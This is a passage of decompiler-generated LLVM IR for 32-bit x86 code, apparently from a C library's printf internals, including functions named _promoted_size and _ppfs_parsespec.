  %v1_804ebfc17 = phi i32 [ %v1_804eb7c, %dec_label_pc_804eb6d ], [ %v1_804ebfc17.pre, %dec_label_pc_804eb76 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804ebfc18 = add i32 %v1_804ebfc17, 28
  %v3_804ebfc19 = inttoptr i32 %v2_804ebfc18 to i32*
  %v4_804ebfc20 = load i32, i32* %v3_804ebfc19, align 4
  %v5_804ebff21 = icmp sgt i32 %v4_804ebfc20, 0
  br i1 %v5_804ebff21, label %dec_label_pc_804eb8b, label %dec_label_pc_804ec31.loopexit

dec_label_pc_804eb8b:                             ; preds = %dec_label_pc_804eb87, %dec_label_pc_804ebfb
  %v1_804ebfc23 = phi i32 [ %v1_804ebfc, %dec_label_pc_804ebfb ], [ %v1_804ebfc17, %dec_label_pc_804eb87 ]
  %v1_804eb8b22 = phi i32 [ %v1_804ebfb, %dec_label_pc_804ebfb ], [ 0, %dec_label_pc_804eb87 ]
  %v2_804eb8b = mul i32 %v1_804eb8b22, 4
  %v3_804eb8b = add i32 %v2_804eb8b, 40
  %v4_804eb8b = add i32 %v3_804eb8b, %v1_804ebfc23
  %v5_804eb8b = inttoptr i32 %v4_804eb8b to i32*
  %v6_804eb8b = load i32, i32* %v5_804eb8b, align 4
  store i32 %v6_804eb8b, i32* %eax.global-to-local, align 4
  %v1_804eb8f = add i32 %v6_804eb8b, -8
  %v9_804eb8f = icmp eq i32 %v1_804eb8f, 0
  br i1 %v9_804eb8f, label %dec_label_pc_804ebfb, label %dec_label_pc_804eb94

dec_label_pc_804eb94:                             ; preds = %dec_label_pc_804eb8b
  %v10_804eb8f = icmp slt i32 %v1_804eb8f, 0
  %v6_804eb8f = sub i32 7, %v6_804eb8b
  %v7_804eb8f = and i32 %v6_804eb8f, %v6_804eb8b
  %v8_804eb8f = icmp slt i32 %v7_804eb8f, 0
  %v1_804eb94 = add i32 %v1_804ebfc23, 76
  %v2_804eb94 = inttoptr i32 %v1_804eb94 to i32*
  %v3_804eb94 = load i32, i32* %v2_804eb94, align 4
  store i32 %v3_804eb94, i32* %edx.global-to-local, align 4
  %v3_804eb97 = icmp eq i1 %v10_804eb8f, %v8_804eb8f
  br i1 %v3_804eb97, label %dec_label_pc_804eba7, label %dec_label_pc_804eb99

dec_label_pc_804eb99:                             ; preds = %dec_label_pc_804eb94
  %tmp15 = icmp slt i32 %v6_804eb8b, 3
  %v9_804eba0 = icmp eq i32 %v6_804eb8b, 7
  %v1_804eba3 = icmp eq i1 %v9_804eba0, false
  %or.cond = or i1 %tmp15, %v1_804eba3
  br i1 %or.cond, label %dec_label_pc_804ebee, label %dec_label_pc_804ebd0

dec_label_pc_804eba7:                             ; preds = %dec_label_pc_804eb94
  %tmp16 = icmp sgt i32 %v6_804eb8b, 1024
  br i1 %tmp16, label %dec_label_pc_804ebb0, label %dec_label_pc_804ebee

dec_label_pc_804ebb0:                             ; preds = %dec_label_pc_804eba7
  %v6_804ebb0 = icmp eq i32 %v6_804eb8b, 2048
  br i1 %v6_804ebb0, label %dec_label_pc_804ebc0, label %dec_label_pc_804ebb7

dec_label_pc_804ebb7:                             ; preds = %dec_label_pc_804ebb0
  %v9_804ebb7 = icmp eq i32 %v6_804eb8b, 2055
  %v1_804ebbc = icmp eq i1 %v9_804ebb7, false
  br i1 %v1_804ebbc, label %dec_label_pc_804ebee, label %dec_label_pc_804ebdf

dec_label_pc_804ebc0:                             ; preds = %dec_label_pc_804ebb0
  %v1_804ebc0 = add i32 %v3_804eb94, 8
  store i32 %v1_804ebc0, i32* %eax.global-to-local, align 4
  store i32 %v1_804ebc0, i32* %v2_804eb94, align 4
  %v0_804ebc6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ebc6 = inttoptr i32 %v0_804ebc6 to i32*
  %v2_804ebc6 = load i32, i32* %v1_804ebc6, align 4
  store i32 %v2_804ebc6, i32* %eax.global-to-local, align 4
  %v1_804ebc8 = add i32 %v0_804ebc6, 4
  %v2_804ebc8 = inttoptr i32 %v1_804ebc8 to i32*
  %v3_804ebc8 = load i32, i32* %v2_804ebc8, align 4
  store i32 %v3_804ebc8, i32* %edx.global-to-local, align 4
  %v1_804ebcb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ebcb = add i32 %v1_804ebcb, 4
  %v3_804ebcb = inttoptr i32 %v2_804ebcb to i32*
  store i32 %v3_804ebc8, i32* %v3_804ebcb, align 4
  %v0_804ebf6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ebf6

dec_label_pc_804ebd0:                             ; preds = %dec_label_pc_804eb99
  %v3_804ebd0 = load i32, i32* %v2_804eb94, align 4
  store i32 %v3_804ebd0, i32* %edx.global-to-local, align 4
  %v1_804ebd3 = add i32 %v3_804ebd0, 8
  store i32 %v1_804ebd3, i32* %eax.global-to-local, align 4
  store i32 %v1_804ebd3, i32* %v2_804eb94, align 4
  %v0_804ebd9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ebd9 = inttoptr i32 %v0_804ebd9 to double*
  %v2_804ebd9 = load double, double* %v1_804ebd9, align 4
  %v2_804ebdb = load i32, i32* %ebx.global-to-local, align 4
  %v4_804ebdb = inttoptr i32 %v2_804ebdb to double*
  store double %v2_804ebd9, double* %v4_804ebdb, align 4
  br label %dec_label_pc_804ebf8

dec_label_pc_804ebdf:                             ; preds = %dec_label_pc_804ebb7
  %v3_804ebdf = load i32, i32* %v2_804eb94, align 4
  store i32 %v3_804ebdf, i32* %edx.global-to-local, align 4
  %v1_804ebe2 = add i32 %v3_804ebdf, 12
  store i32 %v1_804ebe2, i32* %eax.global-to-local, align 4
  store i32 %v1_804ebe2, i32* %v2_804eb94, align 4
  %v0_804ebe8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ebe8 = inttoptr i32 %v0_804ebe8 to x86_fp80*
  %v2_804ebe8 = load x86_fp80, x86_fp80* %v1_804ebe8, align 4
  %v2_804ebea = load i32, i32* %ebx.global-to-local, align 4
  %v3_804ebea = inttoptr i32 %v2_804ebea to x86_fp80*
  store x86_fp80 %v2_804ebe8, x86_fp80* %v3_804ebea, align 4
  br label %dec_label_pc_804ebf8

dec_label_pc_804ebee:                             ; preds = %dec_label_pc_804eb99, %dec_label_pc_804eba7, %dec_label_pc_804ebb7
  %v1_804ebee = add i32 %v3_804eb94, 4
  store i32 %v1_804ebee, i32* %eax.global-to-local, align 4
  store i32 %v1_804ebee, i32* %v2_804eb94, align 4
  %v0_804ebf4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ebf4 = inttoptr i32 %v0_804ebf4 to i32*
  %v2_804ebf4 = load i32, i32* %v1_804ebf4, align 4
  store i32 %v2_804ebf4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ebf6

dec_label_pc_804ebf6:                             ; preds = %dec_label_pc_804ebc0, %dec_label_pc_804ebee
  %v0_804ebf6 = phi i32 [ %v0_804ebf6.pre, %dec_label_pc_804ebc0 ], [ %v2_804ebf4, %dec_label_pc_804ebee ]
  %v1_804ebf6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ebf6 = inttoptr i32 %v1_804ebf6 to i32*
  store i32 %v0_804ebf6, i32* %v2_804ebf6, align 4
  %v0_804ebf8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ebf8

dec_label_pc_804ebf8:                             ; preds = %dec_label_pc_804ebdf, %dec_label_pc_804ebd0, %dec_label_pc_804ebf6
  %v0_804ebf8 = phi i32 [ %v2_804ebea, %dec_label_pc_804ebdf ], [ %v2_804ebdb, %dec_label_pc_804ebd0 ], [ %v0_804ebf8.pre, %dec_label_pc_804ebf6 ]
  %v1_804ebf8 = add i32 %v0_804ebf8, 12
  store i32 %v1_804ebf8, i32* %ebx.global-to-local, align 4
  %v0_804ebfb.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804ebfc.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ebfb

dec_label_pc_804ebfb:                             ; preds = %dec_label_pc_804eb8b, %dec_label_pc_804ebf8
  %v1_804ebfc = phi i32 [ %v1_804ebfc23, %dec_label_pc_804eb8b ], [ %v1_804ebfc.pre, %dec_label_pc_804ebf8 ]
  %v0_804ebfb = phi i32 [ %v1_804eb8b22, %dec_label_pc_804eb8b ], [ %v0_804ebfb.pre, %dec_label_pc_804ebf8 ]
  %v1_804ebfb = add i32 %v0_804ebfb, 1
  store i32 %v1_804ebfb, i32* %esi.global-to-local, align 4
  %v2_804ebfc = add i32 %v1_804ebfc, 28
  %v3_804ebfc = inttoptr i32 %v2_804ebfc to i32*
  %v4_804ebfc = load i32, i32* %v3_804ebfc, align 4
  %v5_804ebff = icmp slt i32 %v1_804ebfb, %v4_804ebfc
  br i1 %v5_804ebff, label %dec_label_pc_804eb8b, label %dec_label_pc_804ec31.loopexit

dec_label_pc_804ec03:                             ; preds = %entry
  br i1 %v1_804ec0a, label %dec_label_pc_804ec1a, label %dec_label_pc_804ec0c

dec_label_pc_804ec0c:                             ; preds = %dec_label_pc_804ec03
  %v1_804ec0c = add i32 %arg1, 36
  %v2_804ec0c = inttoptr i32 %v1_804ec0c to i8*
  %v3_804ec0c = load i8, i8* %v2_804ec0c, align 1
  %v2_804ec10 = zext i8 %v3_804ec0c to i32
  %v3_804ec10 = mul nuw nsw i32 %v2_804ec10, 12
  store i32 %v3_804ec10, i32* %eax.global-to-local, align 4
  %v2_804ec13 = add i32 %arg1, 68
  %v3_804ec13 = add i32 %v2_804ec13, %v3_804ec10
  %v4_804ec13 = inttoptr i32 %v3_804ec13 to i32*
  %v5_804ec13 = load i32, i32* %v4_804ec13, align 4
  store i32 %v5_804ec13, i32* %eax.global-to-local, align 4
  store i32 %v5_804ec13, i32* %v2_804ec03, align 4
  %v0_804ec1a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ec1a

dec_label_pc_804ec1a:                             ; preds = %dec_label_pc_804ec03, %dec_label_pc_804ec0c
  %v1_804ec2e = phi i32 [ %arg1, %dec_label_pc_804ec03 ], [ %v0_804ec1a.pre, %dec_label_pc_804ec0c ]
  %v1_804ec1a = add i32 %v1_804ec2e, 4
  %v2_804ec1a = inttoptr i32 %v1_804ec1a to i32*
  %v3_804ec1a = load i32, i32* %v2_804ec1a, align 4
  %v8_804ec1a = icmp eq i32 %v3_804ec1a, -2147483648
  %v1_804ec21 = icmp eq i1 %v8_804ec1a, false
  br i1 %v1_804ec21, label %dec_label_pc_804ec31, label %dec_label_pc_804ec23

dec_label_pc_804ec23:                             ; preds = %dec_label_pc_804ec1a
  %v1_804ec23 = add i32 %v1_804ec2e, 37
  %v2_804ec23 = inttoptr i32 %v1_804ec23 to i8*
  %v3_804ec23 = load i8, i8* %v2_804ec23, align 1
  %v2_804ec27 = zext i8 %v3_804ec23 to i32
  %v3_804ec27 = mul nuw nsw i32 %v2_804ec27, 12
  store i32 %v3_804ec27, i32* %eax.global-to-local, align 4
  %v1_804ec2a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ec2a = add nsw i32 %v3_804ec27, -12
  %v3_804ec2a = add i32 %v2_804ec2a, %v1_804ec2a
  %v4_804ec2a = inttoptr i32 %v3_804ec2a to i32*
  %v5_804ec2a = load i32, i32* %v4_804ec2a, align 4
  store i32 %v5_804ec2a, i32* %eax.global-to-local, align 4
  store i32 %v5_804ec2a, i32* %v2_804ec1a, align 4
  %v0_804ec31.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ec31

dec_label_pc_804ec31.loopexit:                    ; preds = %dec_label_pc_804ebfb, %dec_label_pc_804eb87
  %v1_804ebfc.lcssa = phi i32 [ %v1_804ebfc17, %dec_label_pc_804eb87 ], [ %v1_804ebfc, %dec_label_pc_804ebfb ]
  br label %dec_label_pc_804ec31

dec_label_pc_804ec31:                             ; preds = %dec_label_pc_804ec31.loopexit, %dec_label_pc_804ec1a, %dec_label_pc_804ec23
  %v10_804ec38 = phi i32 [ %v1_804ebfc.lcssa, %dec_label_pc_804ec31.loopexit ], [ %v1_804ec2e, %dec_label_pc_804ec1a ], [ %v0_804ec31.pre, %dec_label_pc_804ec23 ]
  %v1_804ec31 = add i32 %v10_804ec38, 8
  %v2_804ec31 = inttoptr i32 %v1_804ec31 to i32*
  %v3_804ec31 = load i32, i32* %v2_804ec31, align 4
  store i32 %v3_804ec31, i32* %eax.global-to-local, align 4
  %v2_804ec34 = icmp slt i32 %v3_804ec31, 0
  %v1_804ec36 = icmp eq i1 %v2_804ec34, false
  br i1 %v1_804ec36, label %dec_label_pc_804ec4c, label %dec_label_pc_804ec38

dec_label_pc_804ec38:                             ; preds = %dec_label_pc_804ec31
  %v1_804ec38 = add i32 %v10_804ec38, 16
  %v2_804ec38 = inttoptr i32 %v1_804ec38 to i32*
  %v3_804ec38 = load i32, i32* %v2_804ec38, align 4
  %v4_804ec38 = or i32 %v3_804ec38, 8
  store i32 %v4_804ec38, i32* %v2_804ec38, align 4
  %v0_804ec3c = load i32, i32* @ecx, align 4
  %v1_804ec3c = add i32 %v0_804ec3c, 16
  %v2_804ec3c = inttoptr i32 %v1_804ec3c to i32*
  %v3_804ec3c = load i32, i32* %v2_804ec3c, align 4
  %v4_804ec3c = and i32 %v3_804ec3c, -2
  store i32 %v4_804ec3c, i32* %v2_804ec3c, align 4
  %v0_804ec40 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec40 = sub i32 0, %v0_804ec40
  store i32 %v1_804ec40, i32* %eax.global-to-local, align 4
  %v1_804ec42 = load i32, i32* @ecx, align 4
  %v2_804ec42 = add i32 %v1_804ec42, 8
  %v3_804ec42 = inttoptr i32 %v2_804ec42 to i32*
  store i32 %v1_804ec40, i32* %v3_804ec42, align 4
  %v0_804ec45 = load i32, i32* @ecx, align 4
  %v1_804ec45 = add i32 %v0_804ec45, 20
  %v2_804ec45 = inttoptr i32 %v1_804ec45 to i32*
  store i32 32, i32* %v2_804ec45, align 4
  %v0_804ec4e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ec4c

dec_label_pc_804ec4c:                             ; preds = %dec_label_pc_804ec31, %dec_label_pc_804ec38
  %v0_804ec4e = phi i32 [ %v3_804ec31, %dec_label_pc_804ec31 ], [ %v0_804ec4e.pre, %dec_label_pc_804ec38 ]
  %v2_804ec4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ec4c, i32* @ebx, align 4
  ret i32 %v0_804ec4e

; uselistorder directives
  uselistorder i32 %v3_804ec27, { 1, 0 }
  uselistorder i32 %v3_804ec10, { 1, 0 }
  uselistorder i32 %v1_804ebfb, { 2, 1, 0 }
  uselistorder i32 %v1_804ebfc, { 0, 2, 1 }
  uselistorder i32 %v3_804eb94, { 1, 0, 2 }
  uselistorder i32* %v2_804eb94, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804eb8f, { 1, 0 }
  uselistorder i32 %v6_804eb8b, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804eb8b22, { 1, 0 }
  uselistorder i1 %v1_804ec0a, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_804ec4c, { 1, 0 }
  uselistorder label %dec_label_pc_804ec31, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ec1a, { 1, 0 }
  uselistorder label %dec_label_pc_804ebfb, { 1, 0 }
  uselistorder label %dec_label_pc_804ebf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ebf6, { 1, 0 }
  uselistorder label %dec_label_pc_804ebee, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eb8b, { 1, 0 }
  uselistorder label %dec_label_pc_804eb87, { 1, 0 }
  uselistorder label %dec_label_pc_804eb6d, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804ec50 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804ec57

dec_label_pc_804ec57:                             ; preds = %dec_label_pc_804ec57, %entry
  %v0_804ec57 = phi i32 [ ptrtoint (i8** @global_var_805320a.105 to i32), %entry ], [ %v1_804ec57, %dec_label_pc_804ec57 ]
  %v1_804ec57 = add i32 %v0_804ec57, -2
  %v1_804ec5a = inttoptr i32 %v1_804ec57 to i16*
  %v2_804ec5a = load i16, i16* %v1_804ec5a, align 2
  %v3_804ec5a = sext i16 %v2_804ec5a to i32
  %v12_804ec5d = icmp ne i32 %v3_804ec5a, %v0_804ec50
  %v6_804ec67 = icmp ugt i32 %v1_804ec57, ptrtoint (i32* @global_var_80531f2.106 to i32)
  %or.cond = and i1 %v6_804ec67, %v12_804ec5d
  br i1 %or.cond, label %dec_label_pc_804ec57, label %dec_label_pc_804ec69

dec_label_pc_804ec69:                             ; preds = %dec_label_pc_804ec57
  %.pre = add i32 %v0_804ec57, -134558196
  %v2_804ec6f = sdiv i32 %.pre, 2
  store i32 %v2_804ec6f, i32* @edx, align 4
  %v1_804ec71 = add i32 %v2_804ec6f, ptrtoint (i8** @global_var_805320a.105 to i32)
  %v2_804ec71 = inttoptr i32 %v1_804ec71 to i8*
  %v3_804ec71 = load i8, i8* %v2_804ec71, align 1
  %v4_804ec71 = zext i8 %v3_804ec71 to i32
  ret i32 %v4_804ec71

; uselistorder directives
  uselistorder i32 %v2_804ec6f, { 1, 0 }
  uselistorder i32 %v1_804ec57, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805320a.105 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ec7a = load i32, i32* @edi, align 4
  %v0_804ec7b = load i32, i32* @esi, align 4
  %v0_804ec7c = load i32, i32* @ebx, align 4
  store i32 %v0_804ec7c, i32* %stack_var_-16, align 4
  %v4_804ec7c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804eca8 = add i32 %tmp76, 24
  %v2_804eca8 = inttoptr i32 %v1_804eca8 to i32*
  %v3_804eca8 = load i32, i32* %v2_804eca8, align 4
  store i32 %v3_804eca8, i32* %eax.global-to-local, align 4
  %v1_804ecaf = add i32 %tmp76, 16
  %v2_804ecaf = inttoptr i32 %v1_804ecaf to i32*
  %v3_804ecaf = load i32, i32* %v2_804ecaf, align 4
  %v1_804ecb2 = and i32 %v3_804ecaf, 128
  %v2_804ecb2 = icmp eq i32 %v1_804ecb2, 0
  store i32 %v1_804ecb2, i32* %edi.global-to-local, align 4
  %v1_804ecb8 = icmp eq i1 %v2_804ecb2, false
  br i1 %v1_804ecb8, label %dec_label_pc_804eccb, label %dec_label_pc_804ecba

dec_label_pc_804ecba:                             ; preds = %entry
  %v2_804ecba = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804ed18.outer

dec_label_pc_804ecc5:                             ; preds = %dec_label_pc_804ee53
  %v1_804ecc5 = add i32 %v0_804ee53.pre.pre, 1
  store i32 %v1_804ecc5, i32* @esi, align 4
  br label %dec_label_pc_804ee63

dec_label_pc_804eccb:                             ; preds = %entry
  %v15_804ec7d = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804eccd

dec_label_pc_804eccd:                             ; preds = %dec_label_pc_804ecf5.dec_label_pc_804eccd_crit_edge, %dec_label_pc_804eccb
  %v2_804ecde = phi i32 [ %v2_804ecde.pre, %dec_label_pc_804ecf5.dec_label_pc_804eccd_crit_edge ], [ %v15_804ec7d, %dec_label_pc_804eccb ]
  %v3_804ecde = phi i32 [ %v1_804ecf5, %dec_label_pc_804ecf5.dec_label_pc_804eccd_crit_edge ], [ 0, %dec_label_pc_804eccb ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ecd1 = mul i32 %v3_804ecde, 4
  store i32 %v1_804ecd1, i32* @ecx, align 4
  %v2_804ecd8 = load i32, i32* %arg1, align 4
  store i32 %v2_804ecd8, i32* @edx, align 4
  %v2_804ecda = add i32 %v1_804ecd1, -4
  %v3_804ecda = add i32 %v2_804ecda, %v2_804ecd8
  %v4_804ecda = inttoptr i32 %v3_804ecda to i32*
  %v5_804ecda = load i32, i32* %v4_804ecda, align 4
  store i32 %v5_804ecda, i32* %eax.global-to-local, align 4
  %v1_804ecde = trunc i32 %v5_804ecda to i8
  %v4_804ecde = add i32 %v2_804ecde, 36
  %v5_804ecde = add i32 %v4_804ecde, %v3_804ecde
  %v6_804ecde = inttoptr i32 %v5_804ecde to i8*
  store i8 %v1_804ecde, i8* %v6_804ecde, align 1
  %v0_804ece2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ece2 = urem i32 %v0_804ece2, 256
  %v2_804ece2 = load i32, i32* @ebx, align 4
  %v3_804ece2 = and i32 %v2_804ece2, -256
  %v4_804ece2 = or i32 %v3_804ece2, %v1_804ece2
  store i32 %v4_804ece2, i32* @ebx, align 4
  %v1_804ece4 = mul i32 %v0_804ece2, 16777216
  %v2_804ece4 = sdiv i32 %v1_804ece4, 16777216
  store i32 %v2_804ece4, i32* %eax.global-to-local, align 4
  %v1_804ece7 = load i32, i32* @edx, align 4
  %v2_804ece7 = load i32, i32* @ecx, align 4
  %v3_804ece7 = add i32 %v1_804ece7, -4
  %v4_804ece7 = add i32 %v3_804ece7, %v2_804ece7
  %v5_804ece7 = inttoptr i32 %v4_804ece7 to i32*
  %v6_804ece7 = load i32, i32* %v5_804ece7, align 4
  %v17_804ece7 = icmp eq i32 %v2_804ece4, %v6_804ece7
  %v1_804eceb = icmp eq i1 %v17_804ece7, false
  br i1 %v1_804eceb, label %dec_label_pc_804f034, label %dec_label_pc_804ecf1

dec_label_pc_804ecf1:                             ; preds = %dec_label_pc_804eccd
  %v3_804ecf1 = trunc i32 %v0_804ece2 to i8
  %v4_804ecf1 = icmp eq i8 %v3_804ecf1, 0
  br i1 %v4_804ecf1, label %dec_label_pc_804ecfb, label %dec_label_pc_804ecf5

dec_label_pc_804ecf5:                             ; preds = %dec_label_pc_804ecf1
  %v0_804ecf5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ecf5 = add i32 %v0_804ecf5, 1
  store i32 %v1_804ecf5, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_804ecf5, 32
  br i1 %tmp175, label %dec_label_pc_804ecf5.dec_label_pc_804eccd_crit_edge, label %dec_label_pc_804ecfb

dec_label_pc_804ecf5.dec_label_pc_804eccd_crit_edge: ; preds = %dec_label_pc_804ecf5
  %v2_804ecde.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eccd

dec_label_pc_804ecfb:                             ; preds = %dec_label_pc_804ecf5, %dec_label_pc_804ecf1
  %v2_804ed00 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804ed18.outer

dec_label_pc_804ed18.outer:                       ; preds = %dec_label_pc_804ecfb, %dec_label_pc_804ecba, %dec_label_pc_804ee35
  %v0_804ed24.ph94 = phi i32 [ %v1_804ee35, %dec_label_pc_804ee35 ], [ %v2_804ecba, %dec_label_pc_804ecba ], [ %v2_804ed00, %dec_label_pc_804ecfb ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804ee35 ], [ %tmp66, %dec_label_pc_804ecba ], [ %tmp66, %dec_label_pc_804ecfb ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804ecbe, %dec_label_pc_804ee35 ], [ 0, %dec_label_pc_804ecba ], [ 0, %dec_label_pc_804ecfb ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ee35 ], [ %v3_804eca8, %dec_label_pc_804ecba ], [ %v3_804eca8, %dec_label_pc_804ecfb ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804ee35 ], [ 0, %dec_label_pc_804ecba ], [ 0, %dec_label_pc_804ecfb ]
  %v7_804ed1f = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804ed1f = trunc i64 %v7_804ed1f to i32
  %v2_804ed27 = add i32 %v8_804ed1f, 80
  br label %dec_label_pc_804ed18

dec_label_pc_804ed18:                             ; preds = %dec_label_pc_804ed18.outer, %dec_label_pc_804edd5
  %v0_804ed24 = phi i32 [ %v0_804ede2, %dec_label_pc_804edd5 ], [ %v0_804ed24.ph94, %dec_label_pc_804ed18.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804edd5 ], [ %stack_var_-32.1.ph, %dec_label_pc_804ed18.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804edd5 ], [ %stack_var_-88.1.ph, %dec_label_pc_804ed18.outer ]
  store i32 %v0_804ed24, i32* @edx, align 4
  store i32 %v0_804ed24, i32* @esi, align 4
  %v1_804ed1a = inttoptr i32 %v0_804ed24 to i8*
  %v2_804ed1a = load i8, i8* %v1_804ed1a, align 1
  %v11_804ed1a = icmp eq i8 %v2_804ed1a, 42
  %v1_804ed1d = icmp eq i1 %v11_804ed1a, false
  br i1 %v1_804ed1d, label %dec_label_pc_804ed2f, label %dec_label_pc_804ed1f

dec_label_pc_804ed1f:                             ; preds = %dec_label_pc_804ed18
  store i32 %v8_804ed1f, i32* %eax.global-to-local, align 4
  %v1_804ed24 = add i32 %v0_804ed24, 1
  store i32 %v1_804ed24, i32* @esi, align 4
  %v0_804ed27 = load i32, i32* @esp, align 4
  %v3_804ed27 = add i32 %v2_804ed27, %v0_804ed27
  %v4_804ed27 = inttoptr i32 %v3_804ed27 to i32*
  store i32 0, i32* %v4_804ed27, align 4
  %v0_804ed49.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ed2f

dec_label_pc_804ed2f:                             ; preds = %dec_label_pc_804ed18, %dec_label_pc_804ed1f
  %v0_804ed49.pre = phi i32 [ %v0_804ed24, %dec_label_pc_804ed18 ], [ %v0_804ed49.pre.pre, %dec_label_pc_804ed1f ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804ed31 = load i32, i32* @global_var_80551a4, align 4
  store i32 %v0_804ed31, i32* %ebp.global-to-local, align 4
  %v4_804ed49.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed49124 = inttoptr i32 %v0_804ed49.pre to i8*
  %v2_804ed49125 = load i8, i8* %v1_804ed49124, align 1
  %v3_804ed49126 = zext i8 %v2_804ed49125 to i32
  %v5_804ed49127 = and i32 %v4_804ed49.pre, -256
  %v6_804ed49128 = or i32 %v3_804ed49126, %v5_804ed49127
  store i32 %v6_804ed49128, i32* %eax.global-to-local, align 4
  %v2_804ed4b129 = sext i8 %v2_804ed49125 to i32
  store i32 %v2_804ed4b129, i32* @ecx, align 4
  %v2_804ed4e130 = mul nsw i32 %v2_804ed4b129, 2
  %v3_804ed4e131 = add i32 %v2_804ed4e130, %v0_804ed31
  %v4_804ed4e132 = inttoptr i32 %v3_804ed4e131 to i8*
  %v5_804ed4e133 = load i8, i8* %v4_804ed4e132, align 1
  %v6_804ed4e134 = and i8 %v5_804ed4e133, 8
  %v7_804ed4e135 = icmp eq i8 %v6_804ed4e134, 0
  %v1_804ed53136 = icmp eq i1 %v7_804ed4e135, false
  br i1 %v1_804ed53136, label %dec_label_pc_804ed39, label %dec_label_pc_804ed55

dec_label_pc_804ed39:                             ; preds = %dec_label_pc_804ed2f, %dec_label_pc_804ed48
  %v2_804ed4b140 = phi i32 [ %v2_804ed4b, %dec_label_pc_804ed48 ], [ %v2_804ed4b129, %dec_label_pc_804ed2f ]
  %v6_804ed49139 = phi i32 [ %v6_804ed49, %dec_label_pc_804ed48 ], [ %v6_804ed49128, %dec_label_pc_804ed2f ]
  %v0_804ed48138 = phi i32 [ %v1_804ed48, %dec_label_pc_804ed48 ], [ %v0_804ed49.pre, %dec_label_pc_804ed2f ]
  %v1_804ed41137 = phi i32 [ %v0_804ed6332, %dec_label_pc_804ed48 ], [ 0, %dec_label_pc_804ed2f ]
  %v1_804ed39 = add i32 %v1_804ed41137, -4094
  %v6_804ed39 = sub i32 4093, %v1_804ed41137
  %v7_804ed39 = and i32 %v6_804ed39, %v1_804ed41137
  %v8_804ed39 = icmp slt i32 %v7_804ed39, 0
  %v9_804ed39 = icmp eq i32 %v1_804ed39, 0
  %v10_804ed39 = icmp slt i32 %v1_804ed39, 0
  %v3_804ed3f = icmp eq i1 %v10_804ed39, %v8_804ed39
  %v4_804ed3f = icmp eq i1 %v9_804ed39, false
  %v5_804ed3f = and i1 %v4_804ed3f, %v3_804ed3f
  br i1 %v5_804ed3f, label %dec_label_pc_804ed48, label %dec_label_pc_804ed41

dec_label_pc_804ed41:                             ; preds = %dec_label_pc_804ed39
  %v3_804ed41 = mul i32 %v1_804ed41137, 10
  store i32 %v3_804ed41, i32* %eax.global-to-local, align 4
  %v2_804ed44 = add i32 %v3_804ed41, -48
  %v3_804ed44 = add i32 %v2_804ed44, %v2_804ed4b140
